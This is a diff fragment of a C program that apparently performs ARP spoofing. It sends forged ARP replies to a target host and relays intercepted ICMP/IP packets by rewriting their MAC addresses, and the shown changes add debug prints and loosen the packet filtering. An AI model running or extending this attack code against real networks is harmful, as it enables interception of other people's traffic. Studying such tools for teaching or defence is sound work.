@@ -218,7 +218,7 @@ int main(int argc, char* argv[])
                 return -1;
         }
 
-	//receive and parse packet -> get sender's mac
+	//receive and parse packet -> get target's mac
         while(1)
         {       
 		int j;
@@ -266,15 +266,16 @@ int main(int argc, char* argv[])
 		
 		
 		if(memcmp(r_ethhdr->ether_shost, s_mac, 6*sizeof(uint8_t)))
-			return 0;
+			continue;
 		
 		//if icmp packet
                 if(r_ethhdr != NULL && ntohs(r_ethhdr->ether_type) == 0x0800)		//icmp is in ip packet
                 {
 			struct libnet_ipv4_hdr* r_ip_hdr;
 			r_ip_hdr = (struct libnet_ipv4_hdr*)(r_packet+14);
-			if(r_ip_hdr != NULL && ntohs(r_ip_hdr->ip_p) == 0x01 && memcmp(&r_ip_hdr->ip_src, &sin->sin_addr, 16))
+			if(r_ip_hdr != NULL && ntohs(r_ip_hdr->ip_p) == 0x01)
 			{
+				printf("get icmp packet!\n");
 				//change mac
 				memcpy(r_ethhdr->ether_shost, mymac, 6*sizeof(uint8_t));
 				memcpy(r_ethhdr->ether_dhost, s_mac, 6*sizeof(uint8_t));
@@ -294,6 +295,7 @@ int main(int argc, char* argv[])
 			//arp request(broadcast) from sender
 			if(!memcmp(r_ethhdr->ether_shost, s_mac, 6*sizeof(uint8_t)))
 			{
+				printf("get arp packet!\n");
 				//send fake arp reply to sender
 				if(pcap_sendpacket(handle, fake_packet, size))
         			{
